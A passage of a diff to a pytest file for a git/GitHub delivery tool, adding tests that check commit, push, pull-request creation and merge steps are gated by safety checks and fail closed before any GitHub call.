+    monkeypatch.setitem(globals_, "git_mutation_config_safety", lambda _repo: (True, None))
+    monkeypatch.setitem(globals_, "run_safe", fake_run_safe)
+    args = argparse.Namespace(
+        operation="merge", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None,
+        run_id="run-merge-reconcile", pr=7, commit_message="title", pr_title="title", pr_body="body",
+        push_remote="origin", push_branch=None, head=None, base="main", merge_method="squash",
+        delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
+    )
+
+    result, rc = ns["execute_mutating_operation"](args, delivery_status)
+
+    assert rc == 2
+    assert result["ok"] is False
+    assert result["decision"]["status"] == result["mutating_run"]["status"] == "blocked"
+    assert result["decision"]["reason"] == "atomic_merge_base_binding_unavailable"
+    assert merge_called["value"] is False
+    assert api_calls["count"] == 1
 
 
 @pytest.mark.parametrize(
     ("operation", "decision_status", "litmus_decision_status", "expected_status", "expected_reason", "expected_effect", "allowed_flag"),
     [
-        ("pre-pr-review", "no_local_delivery_candidate", "stale_or_missing", "pre_pr_review_complete", "busdriver_pre_pr_review_marker_written", "busdriver_write_pr_marker", None),
         ("commit", "draft_changes_need_busdriver_finalization", "commit_litmus_fresh", "committed", "committed", "git_commit", "commit_allowed"),
         ("push", "pr_review_fresh", "pr_review_fresh", "pushed", "pushed", "git_push", "push_allowed"),
-        ("pr-create", "pr_review_fresh", "pr_review_fresh", "pr_created", "pr_created", "gh_pr_create", "pr_allowed"),
-        ("merge", "pr_clean_read_only", "pr_review_fresh", "merged", "merged", "gh_pr_merge", "merge_allowed"),
     ],
 )
 def test_mutating_operation_success_paths_record_lock_release_authority_and_side_effects(
@@ -3146,12 +4822,13 @@ def test_mutating_operation_success_paths_record_lock_release_authority_and_side
     monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", lambda _repo, _dirs: [])
     monkeypatch.setitem(globals_, "staged_changes_status", lambda _repo: (True, None))
     monkeypatch.setitem(globals_, "commit_blocking_dirty_entries", lambda _status, _args: [])
-    monkeypatch.setitem(globals_, "commit_litmus_staged_diff_blocker", lambda _status, _repo: None)
-    monkeypatch.setitem(globals_, "commit_staged_index", lambda _repo, _message, _env_extra=None: {"ok": True, "returncode": 0})
+    monkeypatch.setitem(globals_, "commit_litmus_staged_diff_blocker", lambda _status, _repo, **_kwargs: None)
+    monkeypatch.setitem(globals_, "commit_staged_index", lambda _repo, _message, _env_extra=None, **_kwargs: {"ok": True, "returncode": 0, "commit_verified": True, "after_head": "after"})
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "normalized_pr_head_arg", lambda _repo, _head, _branch, _remote: (_head, None))
     monkeypatch.setitem(globals_, "github_repo_slug", lambda _repo, _remote: "owner/repo")
@@ -3166,6 +4843,7 @@ def test_mutating_operation_success_paths_record_lock_release_authority_and_side
             lambda _repo, _args: ({"ok": True, "reason": "busdriver_pre_pr_review_marker_written", "side_effects": [{"name": "busdriver_write_pr_marker", "ok": True}]}, 0),
         )
     elif operation == "push":
+        mock_isolated_push(monkeypatch, globals_, True)
         live_head_calls = {"count": 0}
         def fake_live_remote_branch_head(_repo, _branch, _remote):
             live_head_calls["count"] += 1
@@ -3175,12 +4853,44 @@ def test_mutating_operation_success_paths_record_lock_release_authority_and_side
         monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
         monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": True, "returncode": 0})
     elif operation == "pr-create":
+        pr_query_calls = {"count": 0}
+        def fake_pr_create_run_safe(cmd, _repo, **_kwargs):
+            if cmd[:2] == ["gh", "api"]:
+                pr_query_calls["count"] += 1
+                if pr_query_calls["count"] == 1:
+                    payload = []
+                else:
+                    payload = [{
+                        "number": 7,
+                        "state": "open",
+                        "head": {"sha": "after", "ref": "feature", "repo": {"full_name": "owner/repo"}},
+                        "base": {"sha": "origin/main", "ref": "main", "repo": {"full_name": "owner/repo"}},
+                        "html_url": "https://github.com/owner/repo/pull/7",
+                    }]
+                return {"ok": True, "returncode": 0, "stdout_tail": json.dumps(payload), "stderr_tail": ""}
+            return {"ok": True, "returncode": 0, "stdout_tail": "https://github.com/owner/repo/pull/7", "stderr_tail": ""}
         monkeypatch.setitem(globals_, "live_remote_branch_head", lambda _repo, _branch, _remote: ("after", None))
-        monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": True, "returncode": 0})
+        monkeypatch.setitem(globals_, "run_safe", fake_pr_create_run_safe)
     elif operation == "merge":
-        monkeypatch.setitem(globals_, "run_pr_grind_loop", lambda _repo, _args: (safe_loop_payload(), 0))
+        merge_query_calls = {"count": 0}
+        def fake_merge_run_safe(cmd, _repo, **_kwargs):
+            if cmd[:2] == ["gh", "api"]:
+                merge_query_calls["count"] += 1
+                merged = merge_query_calls["count"] > 1
+                payload = {
+                    "number": 7,
+                    "state": "closed" if merged else "open",
+                    "merged_at": "2026-07-10T00:00:00Z" if merged else None,
+                    "merge_commit_sha": "merge-sha" if merged else None,
+                    "head": {"sha": "abc123", "ref": "feature", "repo": {"full_name": "owner/repo"}},
+                    "base": {"sha": "origin/main", "ref": "main", "repo": {"full_name": "owner/repo"}},
+                    "html_url": "https://github.com/owner/repo/pull/7",
+                }
+                return {"ok": True, "returncode": 0, "stdout_tail": json.dumps(payload), "stderr_tail": ""}
+            return {"ok": True, "returncode": 0, "stdout_tail": "", "stderr_tail": ""}
+        monkeypatch.setitem(globals_, "run_pr_grind_loop", lambda _repo, _args: (bound_safe_loop_payload(_repo), 0))
         monkeypatch.setitem(globals_, "pr_grind_loop_envelope_safe", lambda _loop: True)
-        monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": True, "returncode": 0})
+        monkeypatch.setitem(globals_, "run_safe", fake_merge_run_safe)
 
     args = argparse.Namespace(
         operation=operation,
@@ -3252,3 +4962,27 @@ def test_delivery_status_failure_prevents_verifier_execution(tmp_path: Path):
     assert not marker.exists()
     assert Path(data["run_artifact_path"]).exists()
     assert_finalization_blocked(data["decision"])
+
+
+def test_pr_create_fails_closed_before_any_network_mutation(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-pr-create-blocked")
+    assert run(["git", "remote", "add", "origin", "https://github.com/owner/repo.git"], repo).returncode == 0
+    status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
+    called = {"network": False}
+    globals_ = ns["execute_mutating_operation"].__globals__
+    original_run_safe = globals_["run_safe"]
+    def guarded_run_safe(cmd, *args, **kwargs):
+        if cmd and cmd[0] == "gh":
+            called["network"] = True
+            pytest.fail("GitHub network mutation must not execute")
+        return original_run_safe(cmd, *args, **kwargs)
+    globals_["run_safe"] = guarded_run_safe
+    globals_["acquire_finalization_lock"] = lambda *_a, **_k: {"acquired": True, "token": "test-lock"}
+    globals_["release_finalization_lock"] = lambda *_a, **_k: {"released": True}
+    globals_["run_delivery_status"] = lambda *_a, **_k: (status, 0)
+    args = argparse.Namespace(operation="pr-create", mode="execute", repo=str(repo), expected_repository="owner/repo", plugin_root=None, state_dir=None, run_id=None, pr=None, commit_message=None, pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None, base=None, busdriver_state_dir_name=None)
+    result, rc = ns["execute_mutating_operation"](args, status)
+    assert rc == 2
+    assert result["decision"]["reason"] == "atomic_pr_create_binding_unavailable"
+    assert called["network"] is False
